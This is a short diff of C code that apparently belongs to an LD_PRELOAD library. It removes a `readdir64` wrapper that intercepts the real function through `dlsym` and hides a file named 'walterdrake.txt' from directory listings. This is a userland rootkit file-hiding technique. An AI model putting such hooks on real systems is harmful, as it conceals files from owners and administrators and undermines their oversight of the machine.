@@ -32,23 +32,3 @@ struct dirent *readdir(DIR *dirp)
     }
     return NULL;
 }
-
-struct dirent64 *readdir64(DIR *dirp)
-{
-    static struct dirent64 *(*origReaddir64)(DIR *) = NULL;
-    if (!origReaddir64)
-    {
-        origReaddir64 = dlsym(RTLD_NEXT, "readdir64");
-        if (!origReaddir64)
-            return NULL;
-    }
-
-    struct dirent64 *d;
-    while ((d = origReaddir64(dirp)) != NULL)
-    {
-        if(strcmp(d->d_name, "walterdrake.txt") == 0 && d->d_type == DT_REG)
-            continue;
-        return d;
-    }
-    return NULL;
-}
